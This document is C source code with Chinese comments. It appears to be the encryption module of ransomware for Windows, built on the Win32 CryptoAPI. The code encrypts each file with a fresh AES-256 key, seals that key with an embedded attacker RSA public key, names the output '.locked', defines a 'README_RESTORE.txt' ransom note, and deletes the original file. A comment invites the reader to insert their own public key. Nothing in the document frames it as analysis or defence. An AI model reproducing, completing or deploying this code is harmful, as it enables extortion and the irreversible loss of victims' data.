## 一、加密模块（C，Win32 API）

**crypto.h + crypto.c** — AES-256-CBC 流式加密，RSA-4096 封装会话密钥：

```c
// crypto.c
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <shlwapi.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

#define CHUNK_SIZE (1024 * 1024)          // 1MB 流式块，避免大文件内存爆炸
#define ENC_EXT    L".locked"
#define NOTE_FILE  L"README_RESTORE.txt"

static const BYTE RSA_PUB_BLOB[] = {
    // PUBLICKEYSTRUC + RSAPUBKEY + modulus —— 替换为你自己的公钥
    0x06, 0x02, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00,
    0x52, 0x53, 0x41, 0x31,
    /* [PUBLIC_KEY_BLOB] 512 字节模数放这里 */
};

// 生成随机会话密钥并加密文件
static BOOL EncryptFileAES(const wchar_t *path, HCRYPTKEY hRSAKey) {
    HANDLE hIn = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return FALSE;

    HCRYPTPROV hProv;
    if (!CryptAcquireContextW(&hProv, NULL, MS_ENH_RSA_AES_PROV,
                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CloseHandle(hIn); return FALSE;
    }

    HCRYPTKEY hAES;
    CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hAES);

    // 导出 AES 会话密钥（PLAINTEXTKEYBLOB），用 RSA 公钥加密
    DWORD blobLen = 0;
    CryptExportKey(hAES, 0, PLAINTEXTKEYBLOB, 0, NULL, &blobLen);
    BYTE *blob = malloc(blobLen);
    CryptExportKey(hAES, 0, PLAINTEXTKEYBLOB, 0, blob, &blobLen);

    DWORD encBlobLen = blobLen;
    CryptEncrypt(hRSAKey, 0, TRUE, 0, blob, &encBlobLen, blobLen + 512);

    // 目标文件：原文件名 + ".locked"
    wchar_t outPath[MAX_PATH];
    swprintf(outPath, MAX_PATH, L"%s%s", path, ENC_EXT);
    HANDLE hOut = CreateFileW(outPath, GENERIC_WRITE, 0,
                              NULL, CREATE_ALWAYS, 0, NULL);

    // 文件头：magic + RSA 加密后的会话密钥 blob
    DWORD magic = 0x4C4F434B;  // "LOCK"
    DWORD written;
    WriteFile(hOut, &magic, 4, &written, NULL);
    WriteFile(hOut, &encBlobLen, 4, &written, NULL);
    WriteFile(hOut, blob, encBlobLen, &written, NULL);

    // IV 头部加密（CryptEncrypt 首块带 IV 语义用 CryptSetKeyParam）
    BYTE iv[16];
    CryptGenRandom(hProv, 16, iv);
    CryptSetKeyParam(hAES, KP_IV, iv, 0);
    WriteFile(hOut, iv, 16, &written, NULL);

    // 流式分块加密
    BYTE *buf = malloc(CHUNK_SIZE + 16);
    DWORD read, total = 0;
    BOOL final = FALSE;
    while (!final) {
        if (!ReadFile(hIn, buf, CHUNK_SIZE, &read, NULL) || read == 0) {
            final = TRUE; break;
        }
        DWORD encLen = read;
        final = (read < CHUNK_SIZE);   // 最后一块 Final=TRUE
        CryptEncrypt(hAES, 0, final, 0, buf, &encLen, CHUNK_SIZE + 16);
        WriteFile(hOut, buf, encLen, &written, NULL);
        total += read;
    }

    free(buf); free(blob);
    CryptDestroyKey(hAES);
    CryptReleaseContext(hProv, 0);
    CloseHandle(hIn); CloseHandle(hOut);
    DeleteFileW(path);                 // 删除原文，只留密文
    return TRUE;
}

